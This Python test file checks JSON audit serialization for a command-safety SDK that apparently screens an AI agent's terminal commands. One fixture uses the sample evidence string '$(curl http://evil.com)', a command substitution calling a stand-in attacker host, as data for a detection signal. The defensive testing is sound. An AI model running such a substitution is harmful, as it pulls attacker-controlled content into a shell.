"""Tests for Bundle SDK audit serialization."""

from __future__ import annotations

import json

from action_registry.types import ActionType
from command_shield.verdict import Signal
from intentframe_native_bundles.shared.files.evidence import FileIntel
from intentframe_native_bundles.actions.terminal.evidence import CommandIntel
from intentframe_native_bundles.shared.files.evidence_keys import FILE_INTEL_KEY
from intentframe_native_bundles.actions.terminal.evidence_keys import (
    COMMAND_INTEL_KEY,
    TERMINAL_COMMAND_SIGNALS_KEY,
)
from intentframe_bundle_sdk.audit_dump import (
    audit_dump,
    dump_bundle_ai_context,
    dump_bundle_context,
)
from intentframe_bundle_sdk.types import BundleAIContext, BundleContext, EnrichmentRecord
from intentframe_core.types import IntentFrame


def _intent(action: ActionType = ActionType.RUN_COMMAND, target: str = "echo hi") -> IntentFrame:
    return IntentFrame(
        action=action,
        target=target,
        reason="audit test",
        agent_id="audit_tester",
    )


class TestAuditDump:
    def test_pydantic_intent_frame(self):
        dumped = audit_dump(_intent())
        assert dumped["action"] == ActionType.RUN_COMMAND.value
        assert dumped["target"] == "echo hi"

    def test_pydantic_command_intel(self):
        intel = CommandIntel(verdict="SAFE", capabilities=("capability:read_only:file",))
        dumped = audit_dump(intel)
        assert dumped["verdict"] == "SAFE"
        assert dumped["capabilities"] == ["capability:read_only:file"]

    def test_dataclass_signal(self):
        sig = Signal(
            check="structural",
            signal_id="command_substitution",
            description="Contains substitution",
            evidence="$(curl http://evil.com)",
        )
        dumped = audit_dump((sig,))
        assert dumped[0]["signal_id"] == "command_substitution"

    def test_bundle_context_full_dump(self):
        ctx = BundleContext(intent=_intent())
        ctx.evidence[COMMAND_INTEL_KEY] = CommandIntel(verdict="NEEDS_REVIEW")
        ctx.evidence[TERMINAL_COMMAND_SIGNALS_KEY] = (
            Signal(
                check="structural",
                signal_id="command_substitution",
                description="substitution",
                evidence="x",
            ),
        )
        ctx.evidence[FILE_INTEL_KEY] = FileIntel(language="python", size_bytes=42)
        ctx.enrichment = EnrichmentRecord(
            applied=True,
            bundle_id="terminal",
            target_submitted="old",
            target_after="new",
        )

        dumped = dump_bundle_context(ctx)
        assert dumped is not None
        assert dumped["intent"]["action"] == ActionType.RUN_COMMAND.value
        assert dumped["evidence"]["command_intel"]["verdict"] == "NEEDS_REVIEW"
        assert dumped["evidence"]["terminal_command_signals"][0]["signal_id"] == "command_substitution"
        assert dumped["evidence"]["file_intel"]["language"] == "python"
        assert dumped["enrichment"]["bundle_id"] == "terminal"
        json.dumps(dumped)

    def test_bundle_ai_context_full_dump(self):
        ai_ctx = BundleAIContext(
            ae_system_instructions="CUSTOM AE",
            ae_external_context="\nTERMINAL COMMAND — STRUCTURAL SIGNALS:\n  - x",
            ae_prompt_label="critical_run_command",
        )
        dumped = dump_bundle_ai_context(ai_ctx)
        assert dumped is not None
        assert dumped["ae_system_instructions"] == "CUSTOM AE"
        assert dumped["ae_prompt_label"] == "critical_run_command"
        assert dumped["ae_intent_signals"] == []
        assert dumped["ae_signal_truncated"] is False
        json.dumps(dumped)

    def test_none_contexts_return_none(self):
        assert dump_bundle_context(None) is None
        assert dump_bundle_ai_context(None) is None
